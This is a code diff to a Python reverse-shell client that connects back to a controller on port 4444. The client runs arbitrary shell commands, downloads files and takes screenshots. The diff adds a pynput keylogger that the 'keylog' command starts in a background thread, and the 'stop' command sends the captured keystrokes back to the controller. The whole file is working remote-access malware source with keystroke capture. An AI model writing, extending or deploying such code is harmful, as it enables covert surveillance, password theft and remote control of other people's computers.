@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+
 import os
 import socket
 import subprocess
@@ -7,9 +9,13 @@ import numpy as np
 import pyautogui
 import platform
 import time
+import threading
+import pynput
+from pynput.keyboard import Key,Listener
 
 host = "127.0.0.1"
 port = 4444
+keys = ""
 
 def reliable_send(client,data):
     jsonData = json.dumps(data)
@@ -46,6 +52,15 @@ def screenshot(path):
     image = cv2.cvtColor(np.array(image),cv2.COLOR_RGB2BGR)
     cv2.imwrite(path, image)
 
+def pressed(key):
+    global keys
+    keys = keys + str(key)
+
+def keylog():
+    global l
+    l = Listener(on_press=pressed)
+    l.start()
+
 def pathTempFolder(os):
     if os == "Linux":
         path = "/tmp/"
@@ -80,6 +95,10 @@ while True:
             download(client,fileName)
         elif cmd[:2] == "cd" and len(cmd) > 3:
             os.chdir(cmd[3:])
+            time.sleep(3)
+        elif cmd == "keylog":
+            t1 = threading.Thread(target=keylog)
+            t1.start()
         elif cmd == "screenshot":
             os = checkOS()
             path = pathTempFolder(os) + "temp.jpg"
@@ -90,6 +109,11 @@ while True:
                 shell("rm " + path)
             if os == "Windows":
                 shell("del " + path)
+        elif cmd == "stop":
+            l.stop()
+            t1.join()
+            reliable_send(client,keys)
+            keys = ""
         else:
             output = shell(cmd)
             reliable_send(client,output)
